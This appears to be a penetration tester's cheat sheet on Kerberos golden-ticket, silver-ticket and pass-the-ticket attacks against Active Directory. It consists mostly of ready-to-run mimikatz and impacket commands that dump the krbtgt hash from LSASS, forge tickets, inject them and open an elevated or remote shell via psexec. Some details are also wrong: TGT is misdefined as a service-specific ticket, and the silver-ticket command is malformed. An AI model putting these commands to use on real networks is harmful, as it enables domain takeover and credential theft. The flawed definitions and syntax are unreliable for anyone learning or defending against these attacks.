# golden siver passing ticket

* **Silver ticket** is more stealth and discreet; only for target service
* **Golden ticket** works for any kerberos service

**Description of terms:**

* **TGT:** ticket to a service account issued by the KDC and can only access that service.
* **KRBTGT:** service account in KDC; issues all TGTs. If possible to impersonate this account and create a golden
  ticket, we have ability to create a service ticket for any service

## Golden Ticket

### using mimikatz

```bash
# dump hash and SID
lsadump::lsa /inject /name: krbtgt

# create ticket golden
kerberos::golden /user:Administrator /domain:DOMAIN /sid:SID /krbtgt:KRBTGT_NTLM_HASH /id:500

# open a new elevated command prompt with the given ticket in mimikatz.
misc::cmd
```

### using impacket

```bash
impacket-ticketer -nthash KRBTGT_NTLM_HASH -domain-sid DOMAIN_SID -domain FQDN_DOMAIN USERNAME
export KRB5CCNAME=FILE.cache
impacket-psexec DOMAIN/USER@DOMAIN -k -no-pass
# can try impacket-secretsdump
```

## Silver Ticket

### mimikatz

```bash
# dump
lsadump::lsa /inject /name: [<domain-admin-account> | <service-account>]

# create ticket silver
kerberos::golden /user:<USER> /domain:DOMAINM /sid:SID /krbtgt:SERVICE_NTLM_hash /id:1103
misc::cmd
```

## Pass-the-ticket

* Can be used for dumping user credentials inside an AD network
* Can dump the TGT from the LSASS memory (which stores Kerberos ticket as the gatekeeper and accept or reject the
  credentials provided)
* Gives a .kirbi ticket - can be used to get domain admin
* Allows to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket

### using mimikatz

```bash
# exports all .kirbi to current directory
sekurlsa::tickets /export

# find some admin .kirbi from krbtgt
kerberos::ptt TICKET

# to check if ticket is working
> klist
```